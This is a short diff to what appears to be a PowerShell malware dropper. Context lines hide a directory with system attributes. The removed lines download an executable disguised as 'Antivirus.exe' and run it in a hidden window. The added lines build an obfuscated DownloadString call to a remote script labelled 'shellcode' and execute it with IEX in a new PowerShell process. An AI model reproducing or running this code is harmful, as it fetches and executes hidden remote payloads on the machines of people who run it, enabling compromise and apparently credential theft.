@@ -5,12 +5,6 @@ New-Item -ItemType Directory -Path $dir
 attrib +h +s $dir
 
 
-$url = "https://github.com/43a1723/test/raw/main/Extras/hacklife/Antivirus.exe"
-$output = "$dir\loader.exe"
-
-if (Test-Path -Path $output) {
-    Write-Host "hello"
-} else {
-    Invoke-WebRequest -Uri $url -OutFile $output
-    Start-Process -WindowStyle Hidden -FilePath $output
-}
+$shellcode = ("https://raw.githubusercontent.com/s1uiasdad/log-acc-v2/main/scr/shellcode/freefire.ps1")
+$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
+Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
